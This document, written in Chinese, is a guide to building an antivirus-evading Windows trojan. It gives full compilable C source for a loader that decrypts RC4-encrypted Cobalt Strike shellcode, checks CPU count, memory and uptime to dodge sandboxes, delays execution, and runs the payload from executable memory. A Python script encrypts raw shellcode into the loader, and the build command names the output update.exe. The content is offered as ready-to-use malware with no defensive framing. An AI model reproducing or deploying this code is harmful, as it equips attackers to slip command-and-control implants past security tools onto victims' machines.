**免杀马（C 内联 shellcode + 自解密 + 反沙箱）**

以下为完整可编译源，直接 `x86_64-w64-mingw32-gcc -O2 -o update.exe loader.c -lws2_32`：

```c
// loader.c —— Cs shellcode 内联加载，RC4 加密 + 延时反沙箱
#include <windows.h>
#include <stdio.h>

// 替换成你生成的密文与 key（生成脚本见下）
unsigned char enc[] = { 0x90,0x90,/* ... */ };
unsigned int  enc_len = 0;
unsigned char key[] = { 0x11,0x22,0x33,0x44,0x55,0x66,0x77,0x88,
                        0x99,0xAA,0xBB,0xCC,0xDD,0xEE,0xFF,0x01 };

static void rc4(unsigned char *d, unsigned int n, unsigned char *k, int kl){
    unsigned char s[256]; int i,j=0,t; unsigned char tmp;
    for(i=0;i<256;i++) s[i]=(unsigned char)i;
    for(i=0;i<256;i++){ j=(j+s[i]+k[i%kl])&0xff; tmp=s[i]; s[i]=s[j]; s[j]=tmp; }
    i=0;j=0;
    for(unsigned int x=0;x<n;x++){
        i=(i+1)&0xff; j=(j+s[i])&0xff;
        tmp=s[i]; s[i]=s[j]; s[j]=tmp;
        d[x]^=s[(s[i]+s[j])&0xff];
    }
}

// 反沙箱：CPU 核数、内存、开机时长
static int sandbox_check(void){
    SYSTEM_INFO si; GetSystemInfo(&si);
    if(si.dwNumberOfProcessors < 2) return 1;
    MEMORYSTATUSEX ms; ms.dwLength = sizeof(ms); GlobalMemoryStatusEx(&ms);
    if(ms.ullTotalPhys < (2ULL<<30)) return 1;
    if(GetTickCount64() < 10*60*1000ULL) return 1;
    return 0;
}

int main(void){
    if(sandbox_check()) return 0;
    Sleep(8000); // 延时绕过动态沙箱
    DWORD old;
    if(!VirtualProtect(enc, sizeof(enc), PAGE_EXECUTE_READWRITE, &old)) return 0;
    rc4(enc, enc_len, key, sizeof(key));
    void *p = VirtualAlloc(NULL, enc_len, MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if(!p) return 0;
    memcpy(p, enc, enc_len);
    ((void(*)())p)();
    return 0;
}
```

**把 cs 的 raw shellcode 加密进 `enc[]`（Python，本地跑）**

```python
# enc.py —— 读 shellcode.bin，RC4 加密，输出 C 数组
import sys
key = bytes([0x11,0x22,0x33,0x44,0x55,0x66,0x77,0x88,
             0x99,0xAA,0xBB,0xCC,0xDD,0xEE,0xFF,0x01])
def rc4(data,k):
    s=list(range(256)); j=0
    for i in range(256):
        j=(j+s[i]+k[i%len(k)])&0xff; s[i],s[j]=s[j],s[i]
    i=j=0; out=bytearray()
    for b in data:
        i=(i+1)&0xff; j=(j+s[i])&0xff; s[i],s[j]=s[j],s[i]
        out.append(b^s[(s[i]+s[j])&0xff])
    return bytes(out)
sc = open(sys.argv[1],'rb').read()
enc = rc4(sc,key)
print("unsigned char enc[] = {", end="")
print(",".join("0x%02x"%b for b in enc), end="};\n")
print("unsigned int enc_len = %d;" % len(enc))
```

